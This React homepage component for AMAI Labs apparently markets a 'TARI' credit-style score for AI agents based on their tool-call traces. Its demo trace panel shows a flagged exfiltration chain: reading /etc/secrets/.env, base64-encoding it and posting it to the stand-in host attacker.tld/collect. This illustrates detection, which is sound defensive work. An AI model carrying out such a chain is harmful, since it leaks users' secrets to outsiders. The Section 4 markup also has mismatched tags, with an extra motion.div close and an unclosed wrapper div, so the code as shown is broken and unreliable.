import { useState } from "react";
import { motion } from "framer-motion";
import amaiLogo from "@/assets/amai-logo-tm.png";
import homeFallbackBg from "@/assets/home-fallback-bg.jpg";
import { useLanguage } from "@/contexts/LanguageContext";
import { useIsMobile } from "@/hooks/use-mobile";
import { Footer } from "@/components/Footer";
import { HomeThesis } from "@/components/HomeThesis";
import { TariGauge } from "@/components/TariGauge";

const navItems = ["Score", "Risk", "Methodology", "Bureau", "Coverage", "Docs", "Research"];

const Home = () => {
  const { t, language } = useLanguage();
  const isRtl = language === 'ar';
  const isMobile = useIsMobile();

  const [scrolled, setScrolled] = useState(false);


  return (
    <div className="bg-black" dir={isRtl ? 'rtl' : 'ltr'}>
      {/* Hero section — full viewport */}
      <div className="h-svh md:h-screen flex flex-col">
        {/* Black header spacer to prevent background bleed */}
        <div className="h-16 bg-black flex-shrink-0" />
        
        {/* Main content with background */}
        <div className="flex-1 flex items-center justify-center overflow-hidden relative">
          {/* Fallback background image — slow breathing zoom toward center */}
          <motion.img
            src={homeFallbackBg}
            alt=""
            className="absolute inset-0 w-full h-full object-cover will-change-transform"
            initial={{ scale: 1 }}
            animate={{ scale: [1, 1.12, 1] }}
            transition={{ duration: 18, ease: "easeInOut", repeat: Infinity }}
          />
          <div className="relative z-10 text-center px-6 max-w-3xl mx-auto">
            {/* AMAI Logo */}
            <motion.img
              src={amaiLogo}
              alt="AMAI Labs"
              className="h-12 md:h-20 w-auto mx-auto mb-8 md:mb-10 brightness-110"
              initial={{ opacity: 0, scale: 0.8 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ duration: 0.8, delay: 0.2 }}
            />


            {/* Body Text */}
            <motion.div
              className="mb-8 md:mb-10 max-w-xl mx-auto"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.6 }}
            >
              <p className="text-sm md:text-base text-white/70 font-light leading-relaxed tracking-wide whitespace-pre-line">
                {t('home.body')}
              </p>
            </motion.div>

            {/* Scroll indicator */}
            <motion.div
              className="mt-10 md:mt-14 flex flex-col items-center gap-4"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.8 }}
            >
              <span className="text-[10px] md:text-xs uppercase tracking-[0.35em] text-white/50 font-light">
                Scroll
              </span>
              <div className="relative w-8 h-14 flex items-center justify-center">
                {/* Animated track */}
                <div className="absolute inset-x-3 top-1 bottom-1 rounded-full border border-white/15" />
                {/* Floating orb */}
                <motion.div
                  className="absolute w-1.5 h-1.5 rounded-full bg-white/80 shadow-[0_0_10px_rgba(255,255,255,0.5)]"
                  animate={{ y: [-12, 12, -12] }}
                  transition={{ duration: 2.2, ease: "easeInOut", repeat: Infinity }}
                />
                {/* Decorative symbols */}
                <motion.span
                  className="absolute -top-4 -left-5 text-white/25 text-xs"
                  animate={{ opacity: [0.25, 0.55, 0.25], rotate: [0, 12, 0] }}
                  transition={{ duration: 3.5, repeat: Infinity }}
                >
                  ✦
                </motion.span>
                <motion.span
                  className="absolute -bottom-3 -right-5 text-white/25 text-xs"
                  animate={{ opacity: [0.25, 0.5, 0.25], rotate: [0, -12, 0] }}
                  transition={{ duration: 4, repeat: Infinity, delay: 0.5 }}
                >
                  ◇
                </motion.span>
                <motion.span
                  className="absolute -top-2 -right-4 text-white/20 text-[10px]"
                  animate={{ opacity: [0.2, 0.45, 0.2], y: [0, 4, 0] }}
                  transition={{ duration: 3, repeat: Infinity, delay: 1 }}
                >
                  +
                </motion.span>
              </div>
            </motion.div>
          </div>
        </div>
      </div>

      {/* Feature card section */}
      <section className="relative bg-perspective-grid py-16 md:py-24 px-4 md:px-8">
        {/* Fade from black at top into the normal grid */}
        <div className="absolute inset-0 bg-gradient-to-b from-black via-black/80 to-transparent pointer-events-none" />
        <div className="max-w-[95vw] mx-auto relative z-10">
          <div className="relative overflow-hidden rounded-3xl border border-white/10 bg-white/[0.04] backdrop-blur-2xl shadow-[0_20px_80px_-20px_rgba(0,0,0,0.8)] min-h-[70vh] md:min-h-[80vh] flex items-center justify-center">
            {/* Glass sheen */}
            <div className="pointer-events-none absolute inset-0 bg-gradient-to-br from-white/[0.06] via-transparent to-transparent" />
            <div className="pointer-events-none absolute -top-1/2 -left-1/2 w-[200%] h-[200%] bg-[radial-gradient(circle_at_center,rgba(166,252,252,0.08),transparent_50%)]" />

            {/* Center content: zoom-out on scroll into view */}
            <motion.div
              className="relative z-10 flex flex-col items-center justify-center px-6 py-16 text-center max-w-5xl mx-auto"
              initial={{ scale: 0.55, opacity: 0, filter: "blur(12px)" }}
              whileInView={{ scale: 1, opacity: 1, filter: "blur(0px)" }}
              viewport={{ once: false, amount: 0.5 }}
              transition={{ duration: 1.4, ease: [0.16, 1, 0.3, 1] }}
            >
              <div className="mb-10 md:mb-14 w-full">
                <TariGauge score={812} />
              </div>
              <h2 className="text-4xl md:text-6xl lg:text-7xl font-medium tracking-tight text-white leading-[1.05]">
                A credit score for AI agents.
              </h2>
              <p className="mt-8 md:mt-10 text-lg md:text-2xl lg:text-3xl font-light text-white/80 leading-snug max-w-4xl">
                AMAI reads how an agent behaves, every tool it calls &amp; every boundary it crosses, telling you which ones to trust without ever touching your data.
              </p>

              {/* Pill nav strip — fixed width, six visible, one more on click */}
              <motion.nav
                className="mt-16 md:mt-24"
                initial={{ y: 12 }}
                whileInView={{ y: 0 }}
                viewport={{ once: false, amount: 0.5 }}
                transition={{ duration: 0.9, delay: 0.3, ease: [0.16, 1, 0.3, 1] }}
              >
                <div className="flex items-center justify-center gap-2">
                  <div className="overflow-hidden rounded-full border border-white/10 bg-black/50 backdrop-blur-xl px-2 py-2 shadow-[0_10px_40px_-15px_rgba(0,0,0,0.9)] w-[calc(6*5rem+5*0.5rem+1rem)] md:w-[calc(6*6rem+5*0.5rem+1rem)]">
                    <motion.ul
                      className="flex items-center gap-2"
                      animate={{ x: scrolled ? (isMobile ? "-5.5rem" : "-6.5rem") : 0 }}
                      transition={{ duration: 0.4, ease: [0.16, 1, 0.3, 1] }}
                    >
                      {navItems.map((label) => (
                        <li key={label}>
                          <button
                            type="button"
                            className="w-20 md:w-24 px-0 py-2 md:py-2.5 rounded-full text-xs md:text-sm font-light tracking-wide text-white/70 hover:text-white hover:bg-white/[0.08] transition-all duration-300 whitespace-nowrap"
                          >
                            {label}
                          </button>
                        </li>
                      ))}
                    </motion.ul>
                  </div>
                  <button
                    type="button"
                    onClick={() => setScrolled(s => !s)}
                    className="flex items-center justify-center w-8 h-8 rounded-full border border-white/10 bg-black/50 backdrop-blur-xl text-white/60 hover:text-white hover:bg-white/[0.08] transition-all duration-300"
                    aria-label={scrolled ? "Show earlier items" : "Show more items"}
                  >
                    <span className="text-sm">{scrolled ? '‹' : '›'}</span>
                  </button>
                </div>
              </motion.nav>

            </motion.div>

          </div>
        </div>
      </section>

      {/* Section 3 — SCORE */}
      <section className="relative bg-perspective-grid py-24 md:py-40 px-4 md:px-8 overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-black/40 to-transparent pointer-events-none" />
        {/* Ambient glow */}
        <div className="pointer-events-none absolute -left-40 top-1/3 w-[520px] h-[520px] rounded-full bg-[radial-gradient(circle_at_center,rgba(166,252,252,0.06),transparent_70%)]" />

        <div className="relative z-10 max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-12 gap-16 lg:gap-20 items-start">
          {/* LEFT — copy */}
          <motion.div
            className="lg:col-span-7 text-left"
            initial={{ opacity: 0, y: 24 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true, amount: 0.3 }}
            transition={{ duration: 0.9, ease: [0.16, 1, 0.3, 1] }}
          >
            <div className="flex items-center gap-3 mb-8">
              <span className="h-px w-10 bg-white/30" />
              <span className="text-[11px] tracking-[0.35em] font-light text-white/50 uppercase">Score</span>
            </div>

            <h2 className="text-4xl md:text-6xl lg:text-7xl font-light tracking-tight text-white leading-[1.05]">
              A number you already
              <br />
              know how to read.
            </h2>

            <p className="mt-10 md:mt-12 text-lg md:text-xl font-light text-white/70 leading-relaxed max-w-2xl">
              Every agent earns one TARI score, 300 to 850, the scale the world already trusts. It doesn't predict the future, and it never calls an agent safe. It ranks behavior: the higher the number, the less an agent has done to earn suspicion. And when the signal is too thin to judge, TARI says <span className="text-white font-normal tracking-wide">UNRATED</span>, never a guess.
            </p>

            <div className="mt-16 md:mt-20 pt-10 border-t border-white/10 max-w-2xl">
              <p className="text-2xl md:text-4xl lg:text-5xl font-light tracking-tight text-white leading-[1.15]">
                It measures what an agent <span className="italic text-white/90">did</span>
                <br />
                <span className="text-white/50">not what it promised.</span>
              </p>
            </div>
          </motion.div>

          {/* RIGHT — bands */}
          <motion.div
            className="lg:col-span-5 lg:pt-4"
            initial={{ opacity: 0, y: 24 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true, amount: 0.2 }}
            transition={{ duration: 1, delay: 0.15, ease: [0.16, 1, 0.3, 1] }}
          >
            <div className="relative pl-8 md:pl-10">
              {/* Vertical spine */}
              <div className="absolute left-0 top-2 bottom-2 w-px bg-gradient-to-b from-cyan-300/40 via-emerald-300/30 via-amber-300/30 to-red-400/40" />

              {[
                { range: "800–850", color: "bg-cyan-300", text: "text-cyan-200", label: "No adverse signal. Earned, not certified." },
                { range: "650–799", color: "bg-emerald-300", text: "text-emerald-200", label: "Clean and unremarkable. Acting within bounds." },
                { range: "550–649", color: "bg-amber-300", text: "text-amber-200", label: "Worth a second look." },
                { range: "300–549", color: "bg-red-400", text: "text-red-300", label: "Anomalous. Behavior that doesn't add up." },
                { range: "UNRATED", color: "bg-white/40", text: "text-white/60", label: "Not enough evidence." },
              ].map((band, i) => (
                <motion.div
                  key={band.range}
                  className="relative py-6 md:py-7 first:pt-0"
                  initial={{ opacity: 0, x: 16 }}
                  whileInView={{ opacity: 1, x: 0 }}
                  viewport={{ once: true, amount: 0.4 }}
                  transition={{ duration: 0.7, delay: 0.1 + i * 0.08, ease: [0.16, 1, 0.3, 1] }}
                >
                  {/* Node on spine */}
                  <span className={`absolute -left-[34px] md:-left-[42px] top-8 md:top-9 flex items-center justify-center`}>
                    <span className={`absolute w-3.5 h-3.5 rounded-full ${band.color} opacity-20 blur-[3px]`} />
                    <span className={`relative w-1.5 h-1.5 rounded-full ${band.color}`} />
                  </span>

                  <div className={`text-2xl md:text-3xl font-light tracking-tight ${band.text}`}>
                    {band.range}
                  </div>
                  <div className="mt-2 text-sm md:text-base font-light text-white/60 leading-relaxed max-w-md">
                    {band.label}
                  </div>
                </motion.div>
              ))}
            </div>
          </motion.div>
        </div>
      </section>

      {/* Section 4 — HOW IT WORKS */}
      <section className="relative bg-perspective-grid py-24 md:py-40 px-4 md:px-8 overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-black/40 to-transparent pointer-events-none" />
        <div className="pointer-events-none absolute -right-40 top-1/4 w-[520px] h-[520px] rounded-full bg-[radial-gradient(circle_at_center,rgba(166,252,252,0.05),transparent_70%)]" />

        <div className="relative z-10 max-w-7xl mx-auto">
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 lg:gap-20 items-start">
            {/* LEFT — copy */}
            <motion.div
              className="lg:col-span-7 text-left"
              initial={{ opacity: 0, y: 24 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true, amount: 0.3 }}
              transition={{ duration: 0.9, ease: [0.16, 1, 0.3, 1] }}
            >
              <div className="flex items-center gap-3 mb-8">
                <span className="h-px w-10 bg-white/30" />
                <span className="text-[11px] tracking-[0.35em] font-light text-white/50 uppercase">How it works</span>
              </div>

              <h2 className="text-4xl md:text-6xl lg:text-7xl font-light tracking-tight text-white leading-[1.05]">
                It reads the shape of
                <br />
                what your agent did.
              </h2>

              <p className="mt-10 md:mt-12 text-lg md:text-xl font-light text-white/70 leading-relaxed max-w-2xl">
                Every agent leaves a trace: the tools it calls, the order it calls them, the boundaries it crosses. TARI reads that shape, and only that shape: the names and the timing, never your prompts, your data, or a word the agent wrote. From it, the patterns that betray a compromised agent, a secret pulled and quietly pushed out, an agent drifting past the task it was given, move the score.
              </p>
            </motion.div>

            <ol className="mt-12 md:mt-14 grid grid-cols-1 md:grid-cols-3 gap-8 md:gap-6 lg:gap-8">
              {[
                { title: "Instrument", body: "Three lines of code. Your agent emits a trace of what it did." },
                { title: "Read the behavior", body: "Tool by tool, boundary by boundary. Content-off: the moves, never the message." },
                { title: "Score the pattern", body: "An exfiltration chain, a scope drift, a call to a model it shouldn't reach. What looks like compromise moves the number." },
              ].map((step, i) => (
                <motion.li
                  key={step.title}
                  className="relative pt-6 border-t border-white/10"
                  initial={{ opacity: 0, y: 12 }}
                  whileInView={{ opacity: 1, y: 0 }}
                  viewport={{ once: true, amount: 0.4 }}
                  transition={{ duration: 0.7, delay: 0.1 + i * 0.1, ease: [0.16, 1, 0.3, 1] }}
                >
                  <span className="block text-xs tracking-[0.3em] font-light text-white/40 mb-3">
                    0{i + 1}
                  </span>
                  <div className="text-lg md:text-xl font-light tracking-tight text-white">
                    {step.title}
                  </div>
                  <div className="mt-2 text-sm font-light text-white/60 leading-relaxed">
                    {step.body}
                  </div>
                </motion.li>
              ))}
            </ol>

            <div className="mt-16 md:mt-20 pt-10 border-t border-white/10 max-w-2xl">
              <p className="text-2xl md:text-4xl lg:text-5xl font-light tracking-tight text-white leading-[1.15]">
                It never reads a word,
                <br />
                <span className="text-white/50">and it doesn't need to.</span>
              </p>
            </div>

            <div className="mt-12">
              <a
                href="/methodology"
                className="inline-flex items-center gap-2 text-sm font-light text-white/60 hover:text-white transition-colors duration-300 border-b border-white/20 hover:border-white/60 pb-1"
              >
                Read the full methodology
                <span aria-hidden>→</span>
              </a>
            </div>
          </motion.div>

          {/* RIGHT — live trace visual */}
          <motion.div
            className="lg:col-span-5 lg:pt-4 lg:sticky lg:top-24"
            initial={{ opacity: 0, y: 24 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true, amount: 0.2 }}
            transition={{ duration: 1, delay: 0.15, ease: [0.16, 1, 0.3, 1] }}
          >
            <div className="relative rounded-2xl border border-white/10 bg-black/60 backdrop-blur-xl overflow-hidden shadow-[0_20px_80px_-20px_rgba(0,0,0,0.9)]">
              <div className="flex items-center justify-between px-5 py-3 border-b border-white/10 bg-white/[0.02]">
                <div className="flex items-center gap-2">
                  <span className="w-2 h-2 rounded-full bg-white/20" />
                  <span className="w-2 h-2 rounded-full bg-white/20" />
                  <span className="w-2 h-2 rounded-full bg-white/20" />
                </div>
                <span className="text-[10px] tracking-[0.3em] uppercase text-white/40 font-light">
                  live trace · content-off
                </span>
                <span className="flex items-center gap-1.5 text-[10px] text-white/50 font-light">
                  <motion.span
                    className="w-1.5 h-1.5 rounded-full bg-emerald-400"
                    animate={{ opacity: [0.4, 1, 0.4] }}
                    transition={{ duration: 1.6, repeat: Infinity }}
                  />
                  agent_7f2a
                </span>
              </div>

              <div className="px-6 py-8 font-mono text-sm space-y-3">
                {[
                  { time: "00.014", call: "list_files", scope: "/workspace", danger: false },
                  { time: "00.087", call: "read_file", scope: "/etc/secrets/.env", danger: true },
                  { time: "00.203", call: "base64_encode", scope: "buffer", danger: true },
                  { time: "00.412", call: "http_post", scope: "attacker.tld/collect", danger: true },
                  { time: "00.518", call: "return", scope: "task_complete", danger: false },
                ].map((row, i) => (
                  <motion.div
                    key={i}
                    className="flex items-center gap-4"
                    initial={{ opacity: 0, x: -8 }}
                    whileInView={{ opacity: 1, x: 0 }}
                    viewport={{ once: true, amount: 0.5 }}
                    transition={{ duration: 0.5, delay: 0.3 + i * 0.25 }}
                  >
                    <span className="text-white/30 text-xs tabular-nums w-12">{row.time}</span>
                    <span className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${row.danger ? 'bg-red-400' : 'bg-white/30'}`} />
                    <span className={`${row.danger ? 'text-red-300' : 'text-white/80'} font-light`}>
                      {row.call}
                    </span>
                    <span className="text-white/30 font-light truncate">
                      {row.scope}
                    </span>
                  </motion.div>
                ))}
              </div>

              <motion.div
                className="mx-6 mb-6 mt-2 border border-red-400/30 bg-red-400/[0.04] rounded-lg px-4 py-3"
                initial={{ opacity: 0, y: 8 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true, amount: 0.5 }}
                transition={{ duration: 0.6, delay: 1.6 }}
              >
                <div className="flex items-center justify-between gap-4">
                  <div>
                    <div className="text-[10px] tracking-[0.3em] uppercase text-red-300/80 font-light">
                      pattern flagged
                    </div>
                    <div className="mt-1 text-sm font-light text-red-200">
                      exfiltration chain
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="text-[10px] tracking-[0.2em] uppercase text-white/40 font-light">
                      TARI Δ
                    </div>
                    <div className="mt-1 text-lg font-light text-red-300 tabular-nums">
                      −247
                    </div>
                  </div>
                </div>
              </motion.div>
            </div>

            <div className="mt-4 text-[11px] tracking-[0.25em] uppercase text-white/30 font-light text-center">
              read_file → base64_encode → post_to_url
            </div>
          </motion.div>
        </div>
      </section>





      {/* Placeholder actions section */}
      <section className="relative bg-perspective-grid py-16 px-4 md:px-8">
        <div className="max-w-5xl mx-auto flex flex-col sm:flex-row gap-3 justify-center relative z-10">
          <button className="bg-white text-black hover:bg-white/90 px-6 py-3 rounded-full text-sm font-medium transition-all duration-300">
            Primary Action
          </button>
          <button className="bg-white/5 text-white border border-white/20 hover:bg-white/10 px-6 py-3 rounded-full text-sm font-medium transition-all duration-300 backdrop-blur-sm">
            Secondary Action
          </button>
        </div>
      </section>

      {/* Long-form thesis below hero */}
      <HomeThesis />

      {/* Institutional Footer */}
      <Footer />
    </div>
  );
};

export default Home;
